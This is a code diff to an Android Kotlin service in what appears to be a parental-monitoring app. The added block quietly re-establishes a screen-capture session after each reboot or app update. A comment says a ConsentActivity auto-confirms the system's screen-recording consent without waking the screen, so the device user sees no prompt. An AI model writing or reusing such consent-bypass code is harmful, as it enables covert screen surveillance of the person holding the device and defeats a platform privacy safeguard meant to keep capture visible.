@@ -45,6 +45,11 @@ class MainService : Service() {
         /** Last statusLoop tick (elapsedRealtime); lets others detect a wedged service. */
         @Volatile
         var lastBeat: Long = 0L
+
+        /** Once-per-process flag for the quiet projection re-establish attempt
+         *  (after reboot / app update) — never repeated while this process lives. */
+        @Volatile
+        var bootConsentTried: Boolean = false
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -74,6 +79,22 @@ class MainService : Service() {
         }
 
         WsChild.connect()
+
+        // One-shot per boot/process: quietly re-establish the screen-capture session
+        // (ConsentActivity auto-confirms it without waking the screen). This is what
+        // keeps mirroring popup-free for the parent even after a reboot — by the
+        // time they tap Start, the session is already warm and frames flow instantly.
+        if (!bootConsentTried) {
+            bootConsentTried = true
+            scope.launch {
+                delay(20_000) // let the system settle after boot before touching windows
+                runCatching {
+                    if (Store.paired && !Store.released && !MirrorManager.hasProjection) {
+                        CommandHandler.requestProjectionConsent(applicationContext, quiet = true)
+                    }
+                }
+            }
+        }
 
         scope.launch {
             WsChild.rulesFlow.collect { r -> r?.let { RulesEngine.update(it) } }
